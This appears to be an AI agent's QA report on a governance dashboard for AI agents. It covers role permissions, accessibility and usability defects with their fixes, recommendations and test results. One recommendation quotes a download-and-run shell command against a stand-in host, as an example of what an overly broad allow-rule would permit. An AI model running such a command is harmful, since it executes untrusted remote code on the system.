# QA session, 2026-10-19: the dashboard, by role, for usability and best practice

**Kinan:** "understand the project first, what it is, what has been done, then do an in depth QA
of the dashboard from different roles and testing different features and making sure it follows
best practices and is easy and natural to use".

**Where the weight went.** Earlier passes (2026-09-08 sweep, 09-12/13, 10-07, 10-09, 10-10 by role)
established that every role sees the right sections and every action outside a role is refused by
the server. This pass took that as the baseline, re-checked it briefly, and spent its effort on the
question those passes did not ask: is the page easy and natural to use, and does it follow common
web practice (keyboard, focus, labels, contrast, small screens, wording, feedback)?

**Result in one paragraph.** Permissions and safety behaviour held everywhere. Seven defects were
found and fixed (findings **430–436**), all in how the page treats the person using it: the
conversation with an agent was hard to read and opened on its oldest message, keyboard focus was
thrown to the top of the app after every action, one help text named options that no longer exist,
and two password forms disagreed with the server. Sixteen further items are design questions or
larger changes and are listed as recommendations (§4) for Kinan to decide; the first two matter
most.

## 1. Fixture and method

- **Fixture:** the 2026-10-09 QA fixture (handoff §2): `qa-mock-openai-10` (44102) and
  `governance-gateway-qa10` (18852), on the `dist` built 2026-10-12 from the T86 tree. Accounts
  `rootqa` (Root), `ada`, `bea` (Administrators), `lina` (User, holds `main`), `vic` (Viewer).
  Ledger began this session at #283; this session's entries are #284–#311 and later (sign-ins, one
  lockdown and release, one test rule added and removed, one escalation answered).
- **Two browser tabs on two origins** (`127.0.0.1` and `localhost`), so two accounts were signed in
  at once with separate cookies: ada answered lina's question live.
- **Viewport 1366×768** for the main pass (a common laptop), **375×812** for the phone check.
- **Automated page audit** injected into the page (no download; axe-core is not installed here):
  text contrast against the composited background (WCAG AA), accessible names on every button,
  link and field, duplicate ids, heading order, target sizes, controls clipped by their card,
  horizontal overflow. Script kept in the session scratchpad.
- **Every defect proved by a failing test first**
  (`ui/src/pages/governance/dashboard-qa-2026-10-19.test.ts`, 18 tests: 12 seen red before their
  fix, 2 written after it and proved by mutation, 4 control cases that pass before and after),
  then a **mutation sweep** (each fix undone in turn must make a test fail; result in §7).

## 2. What held (no change needed)

| Area                   | Result                                                                                                                                                                                                                                                     |
| ---------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Sections by role       | Root 14, Administrator 12 (no Accounts management, Organisation, Deployment), User 10, Viewer 7. Each role's "What this account can do" sentence matches what it is shown.                                                                                 |
| Sign-in                | Enter submits; wrong password says only "Invalid credentials"; sign-out clears every field. Warm sign-in 275 ms; login at the Gateway ~100 ms.                                                                                                             |
| Confirmations          | Role change shows `vic: viewer → user (will answer to ada)`; Escape cancels and the role control returns to its old value; Delete, Set password, Lock down and Remove rule all confirm and name what they act on.                                          |
| Kill switch            | Mixed-case `Main` locked `main`: ledger #300 "signalled in 0.4ms, confirmed stopped in 16.9ms"; the notice says nothing was running and that every further action is refused until release.                                                                |
| Escalation, end to end | lina's prompt raised an `exec whoami /groups` question (#308); lina's own page said the agent was waiting and offered "Go to the question"; ada's card named who asked, what, a countdown, severity; Deny recorded under ada (#309), agent refused (#310). |
| Viewer                 | Every ledger detail "[redacted for viewer role]"; Posture and escalation controls disabled; no control that changes anything.                                                                                                                              |
| Accessibility basics   | 0 contrast failures; every control has an accessible name; no duplicate ids; one heading per section in order; visible focus ring (red outline) on keyboard focus; notices are live regions (`role="alert"` / `role="status"`).                            |
| Layout                 | Nothing clipped at 1366 px; at 375 px no horizontal overflow, the section list wraps into chips, nothing clipped.                                                                                                                                          |
| Wording quality        | Most notices are specific and plain (the kill notice, the role-change preview, the folder-grant explanation, the "broader than it looks" warning's example).                                                                                               |

## 3. Defects found and fixed (findings 430–436)

### Finding 430: every message in a conversation began with a blank line and an indent

**Low (usability). Found live as lina.** Each message sits in a box that keeps line breaks
(`white-space: pre-wrap`), and the template's own line break and twenty spaces of indentation were
inside that box, so every message was drawn with an empty line and an indent in front of it. The
transcript was 3,236 px tall; without the padding it is 1,916 px (40% shorter) for the same 32
messages. **Root cause worth knowing:** the formatter (`oxfmt`, run by the pre-commit hook) moves a
long expression inside an element onto lines of its own, so a fix written inside the template is
undone by the next format. Seen in this session: the first fix was reverted by `oxfmt --write`.
**Fix:** the content of each box is built in `panels/conversation-text.ts` (`turnText`,
`streamText`), so each box is one short line the formatter leaves alone. Swept: these three boxes
are the only `pre-wrap` elements in the governance UI.

### Finding 431: a conversation opened on its oldest message, and replies arrived out of sight

**Medium (usability). Found live as lina.** The transcript scrolls inside a capped box (24 rem), and
nothing scrolled it. Opening lina's conversation showed a message from 10/8 (eleven days earlier);
after ada answered, the reply lina was waiting for arrived at the bottom of a 3,236 px box whose
visible window was still at the top (`scrollTop 0`). **Fix:** `page-focus.ts` keeps each transcript
on its newest message when it opens and as turns arrive, unless the reader has scrolled up to read
history (more than 48 px from the bottom), who is left where they are.

### Finding 432: the conversation was drawn in the empty-state style

**Low (usability). Found live.** The conversation's container used `.settings-empty`, the style for
"nothing here yet": centred, small and muted grey. Every message, both people's, was centred grey
text with nothing to set it apart from placeholder copy. **Fix:** its own class,
`.governance-conversation` (`governance.css`): same padding and size, start-aligned, body colour.

### Finding 433: the escalation setting was explained with option names that no longer exist

**Low (wording). Found reading Root's page.** Under "On an unlisted action", the buttons say **Ask a
human** and **Deny**; the sentence above them explained "**Ask on miss** pauses … **Off** denies
outright". Shown to every tier. Swept every English governance string for the retired names: this
was the only one (the other locales carry no governance strings). **Fix:** "Ask a human pauses the
agent and waits for a person to approve or refuse. Deny refuses outright (strict default-deny)."

### Finding 434: Create account sent a password shorter than the minimum

**Low (usability). Found live as Root.** The placeholder says "min 8 characters" and the dashboard
holds a copy of the server's minimum precisely "so the form can state the rule before the request"
(`account-panels.ts`), and two of the three password forms (the first Root, Set password) used it.
Create account did not: a five-character password was sent, and the refusal ("password must be at
least 8 characters", in the server's lowercase) appeared in the banner at the top of the page,
about 1,200 px above the form. **Fix:** the button is held and the form says "Password must be at
least 8 characters." while the field holds 1–7 characters.

### Finding 435: Set password trimmed the password before storing it

**Low (a password that differs from the one typed). Found reading the Set password code during the
same check.** `setAccountPassword` trimmed spaces from both ends. The server stores a password
exactly and sign-in compares it exactly, and Create account and sign-in do not trim, so a password
set as `" pass phrase "` was stored as `"pass phrase"`: the person given the typed password could
not sign in with it. An eight-character password ending in a space was also refused as seven.
**Fix:** sent as typed; a field of only spaces still sends nothing.

### Finding 436: keyboard focus was thrown to the top of the app after every action

**Medium (accessibility: WCAG 2.4.3, focus order). Found live.** The page disables its controls while
a request is out, and a focused control that becomes disabled loses focus to the document. After
Lock down, Create account, Add rule, Deny on a question and every other action, a keyboard user's
next Tab started at "Skip to main content", the top of the whole app, up to fourteen sections above
where they were working; a screen reader user lost their place the same way. Separately, **Talk**
is replaced by the conversation it opens, so the cursor went nowhere instead of into the message
box. **Fix (`page-focus.ts`, called from the page's existing `updated()` hook):** when an action
finishes and focus has been lost, it returns to the control pressed, or, when the action cleared
its form and so disabled that button, to the field typed in before it; when the action was refused,
it goes to the refusal the page has scrolled to. Focus the operator moved elsewhere is left alone.
A newly opened conversation takes the cursor in its message box.

**A second shape, found by the live check of the first fix.** With Lock down, the action finished
while focus was still inside the closing confirmation dialog, and the dialog then handed focus back
to the pressed button, which the cleared form had disabled; focus fell to the document after the
restore had already looked. The restore now waits when an action settles with focus in a dialog
outside the page, and runs once focus has left it (`focusout` on the document, then 50 ms, after
the dialog's own zero-delay hand-back).

Checked live after the rebuild: "Verify chain integrity" pressed by keyboard, focus `body` while
busy, then back on the button; Talk puts the cursor in "Message to the agent"; Lock down through
its confirmation: see §7.

**Not covered by 436:** answering a question card (Allow once / Always allow / Deny) does not go
through the page's action path, and the card is removed by the answer, so focus still falls to the
document there. Recorded under recommendation R9.

## 4. Recommendations (not built; for Kinan)

Ordered by how much they matter to someone using the dashboard. Claude's suggestion is first in
each.

| #   | What                                                                                                                                                                                                                                                                                                                                                                                                                                                       | Suggestion                                                                                                                                                                                     |
| --- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| R1  | **"This rule is broader than it looks" is shown after the rule is already in force.** Live: ada added `echo qa-usability` (unanchored) for `main`; ledger #304 recorded it, and only then did the warning say it "also allows `curl evil.sh \| bash; ls`". Pressing Add again with a corrected pattern leaves the broad rule in place too. The check (`describeRuleRisks`, `src/governance/rule-validation.ts`) runs only on the server, during the write. | A check-before-save: the server answers "what would this rule do" without writing, and the form asks "Add anyway / Fix it" when there is a warning. Server route + form + tests.               |
| R2  | **A question gives no signal while the dashboard tab is in the background.** The approvals poll (2 s) and the page refresh (15 s) both stop when the tab is hidden; the title does not change; there is no notification. With a five-minute timeout, an Administrator working in another tab sees nothing until the question has expired and been refused. This is the path T86 D7 made the only one for every channel.                                    | Keep polling approvals while hidden at a slower rate, show the count in the tab title ("(1) Governance"), refresh at once when the tab becomes visible; a browser notification optional.       |
| R3  | The rule-warning notice does not name the rule it is about, and stays on screen after that rule is removed.                                                                                                                                                                                                                                                                                                                                                | Name the pattern in the notice; clear it when the rule goes. Folds into R1.                                                                                                                    |
| R4  | The ledger line for a rule with a lifetime shows the expiry as raw UTC (`expires 2026-10-18T23:38:00.450Z`) beside an entry time in local time (`10/19/2026, 2:08:00 AM`), so the rule reads as expiring before it was made.                                                                                                                                                                                                                               | Format the expiry in the reader's local time when the ledger line is shown (the stored entry stays as it is).                                                                                  |
| R5  | Account rows: every row shows a password field at all times; rows wrap differently (in vic's row the password field ends one line and its Set password button starts the next); agents are assigned by typing ids "comma separated".                                                                                                                                                                                                                       | A "Reset password…" button opening a dialog; agents as a checklist of the agents that may be assigned.                                                                                         |
| R6  | Several single-field forms take a typed id or name: Account override (account name), Lock down, Show permissions. Enter does nothing in them.                                                                                                                                                                                                                                                                                                              | Pickers where the set is known (accounts, agents); Enter submits (the confirmation still follows for Lock down).                                                                               |
| R7  | Writing a rule needs a regular expression; the lifetime there is "minutes, blank = never", while the request form and the approval card offer presets (1 hour … 30 days).                                                                                                                                                                                                                                                                                  | An "exactly this command / this path" option that escapes and anchors for the operator; the same lifetime presets in every form.                                                               |
| R8  | The section "Awaiting your decision" lists escalations that already ended (one is from 10/11, eight days old); nothing in it is awaiting anything, and items never age out.                                                                                                                                                                                                                                                                                | Title it for what it is ("Unanswered questions that timed out" or similar) and age items out, or let them be dismissed.                                                                        |
| R9  | Question card: the lifetime for "Always allow" is chosen in a small drop-down below and outside the card, after the buttons; "Always allow" in fact allows once and requests a rule, which the card needs a sentence to explain; after answering, the card disappears with no confirmation and focus falls to the document; the person who asked is told "Denied by user" (the tool's wording) without who answered.                                       | Lifetime inside the card before the buttons; a label that says what happens ("Allow and request a rule"); a short "Denied, recorded under your name" line; name the answerer to the requester. |
| R10 | Release (ending a lockdown) acts at once with no confirmation, though it lets a stopped agent act again.                                                                                                                                                                                                                                                                                                                                                   | A confirmation naming the agent, as Lock down has.                                                                                                                                             |
| R11 | The Policy section alone is 5,273 px tall at 1366×768 (about seven screens): four long explanations and 23 rules, each with its full regular expression.                                                                                                                                                                                                                                                                                                   | Explanations collapsed behind "What this means"; the rule list collapsed to its descriptions, the pattern shown on demand.                                                                     |
| R12 | Audit ledger: raw action names (`governance.agent.prompt`), an "admin" chip on sign-ins, no search and no filter by agent, account or date; a scheduled job's full prompt is printed in the list unshortened.                                                                                                                                                                                                                                              | Plain labels for action names, a text search and agent/account filters, long text folded.                                                                                                      |
| R13 | The first sign-in after the Gateway starts took over 20 s with only a dimmed button as feedback (cold start; later sign-ins 275 ms).                                                                                                                                                                                                                                                                                                                       | "Signing in…" on the button while the request is out.                                                                                                                                          |
| R14 | Sixteen drop-downs are 22 px tall; WCAG 2.2 (2.5.8, target size) asks for 24 px.                                                                                                                                                                                                                                                                                                                                                                           | Raise the governance page's select height to 24 px or more.                                                                                                                                    |
| R15 | The section list scrolls to a section but leaves keyboard focus in the list; on a phone, at the very top of the page, the highlighted section is stale until a section reaches the top band.                                                                                                                                                                                                                                                               | Move focus to the section's heading on a jump; highlight the first section when none is in the band.                                                                                           |
| R16 | "Removes all 5 account(s)" (Organisation).                                                                                                                                                                                                                                                                                                                                                                                                                 | A proper plural through the i18n layer.                                                                                                                                                        |

## 5. Changes made

| File                                                            | Change                                                                                                                                            |
| --------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------- |
| `ui/src/pages/governance/page-focus.ts` (new)                   | Findings 431 and 436: focus kept through actions, refusal focused, transcript follows its newest turn, a new conversation takes the cursor.       |
| `ui/src/pages/governance/panels/conversation-text.ts` (new)     | Finding 430: each conversation box's content, so the box stays one line.                                                                          |
| `ui/src/pages/governance/panels/agent-panels.ts`                | Findings 430, 432: boxes call the helpers; container class `governance-conversation`.                                                             |
| `ui/src/styles/governance.css`                                  | Finding 432: `.governance-conversation`.                                                                                                          |
| `ui/src/i18n/locales/en-governance.ts`                          | Finding 433: the help text.                                                                                                                       |
| `ui/src/pages/governance/panels/account-panels.ts`              | Findings 434, 435: `passwordTooShort` and its hint; no trim in `setAccountPassword`.                                                              |
| `ui/src/pages/governance/governance-page.ts`                    | `updated()` calls `afterPageUpdate` (replacing `focusNewRefusal`, which it still calls); one line saved in `run()` to stay at the 700-line limit. |
| `ui/src/pages/governance/dashboard-qa-2026-10-19.test.ts` (new) | 17 tests.                                                                                                                                         |

## 6. Checks

- New test file and mutation sweep (scratchpad `mutate.mjs`): §7.
- `ui/src/pages/governance/` + `ui/src/i18n/`: §7.
- Typechecks `tsconfig.ui.json` and `test/tsconfig/tsconfig.test.ui.json`: 0. i18n verify: 0.
  `oxlint` and `oxfmt --check` on every touched file: clean.
- Not run: the full governance suite (no server code changed) and the full lint gate (40–50
  minutes, alone); both are owed before a commit, per the handoff's rules.
- Live after `node scripts/ui.js build`: lina's conversation opened with the cursor in the message
  box and the log at its bottom (`scrollTop + clientHeight = scrollHeight`), start-aligned in the
  body colour, 0 of 32 message boxes padded; the focus check of §3 (436).

## 7. Final figures

Closing run, one sequential chain, on the final tree:

- `dashboard-qa-2026-10-19.test.ts`: **18 passed**.
- Mutation sweep: **14 of 14 killed**, none invalid (M1 composer focus, M2 transcript follow, M3
  always-follow, M4 refusal focus, M5 restore, M5b fallback, M5c dialog wait, M6 short password,
  M7 trim, M8 help text, M9 empty-state class, M10/M11 whitespace in the two boxes, M12 the empty
  reply's own whitespace).
- `ui/src/pages/governance/` + `ui/src/i18n/`: **48 files passed, 1 skipped; 529 passed, 16
  skipped, 0 failed** (the skipped are the browser-only tests, as before).
- Typechecks `tsconfig.ui.json` 0, `tsconfig.test.ui.json` 0; i18n verify 0; `oxlint` and
  `oxfmt --check` on the eight touched files clean; `node scripts/ui.js build` 0.
- Live, with real keyboard input (the browser pane fires no focus events while its window is
  unfocused, so a script-driven check of focus there proves nothing; noted for the next QA): Lock
  down typed, confirmed with Shift+Tab and Enter, focus returned to the "Lock down an agent" field
  (#330, released #331).
- Fixture left as found: no agent locked, the test rule removed (#305), policy unchanged, servers
  stopped. Ledger ends at **#331** (this session added sign-ins, lockdowns and releases, one test
  rule and its removal, one escalation answered).
- **Full gates, run later the same day, alone, on the combined tree** (this session's findings
  430–436 plus the two follow-up sessions' R1/R3 and R2 work, all uncommitted):
  - governance suite: **259 files passed, 2 skipped; 3,974 passed, 22 skipped, 0 failed** (858 s);
    `ui/src/app/app-host.document-title.test.ts` (touched by R2): 11 passed;
  - typechecks core, core-test, UI, test-UI: all 0;
  - full lint gate: **exit 1 at first**, one shard (`core:ui`), two errors in this session's
    `page-focus.ts` from the type-aware rule `no-unnecessary-boolean-literal-compare`
    (`disabled === true` / `!== true`; the per-file `oxlint` run earlier is not type-aware, so it
    could not see them). Fixed by reading `disabled` directly. Because oxlint failed, the gate had
    not reached its stylelint step. Re-run: shard `core:ui` 0, stylelint 0; every other shard had
    passed in the full run. UI tests after the fix: 45 files, 472 passed, 16 skipped, 0 failed; UI
    typecheck 0; `oxfmt --check` on the 25 changed and new files clean.
